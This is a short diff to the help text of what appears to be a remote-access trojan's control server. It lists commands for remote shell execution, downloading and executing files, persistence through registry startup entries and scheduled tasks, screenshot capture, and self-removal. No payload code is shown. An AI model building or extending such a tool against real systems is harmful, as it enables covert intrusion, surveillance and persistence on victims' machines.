@@ -42,12 +42,13 @@ if __name__ == '__main__':
  >>
 	 
  Available commands:
-    * shell cmd        <sends shell command>
-    * downexec url     <download and execute via shell>
-    * infect           <adds itself to startup via registry>
-    * screenshot       <takes screenshot>
-    * removal          <remove myself>
-    * quit             <quit server>
+    * shell cmd                   <sends shell command>
+    * download url                <download and execute via shell>
+    * schtasks create/delete/run  <create/delete/run schtasks tasks>
+    * infect                      <adds itself to startup via registry>
+    * screenshot                  <takes screenshot>
+    * removal                     <remove myself>
+    * quit                        <quit server>
 '''
 
 	if (socket_create() == True):
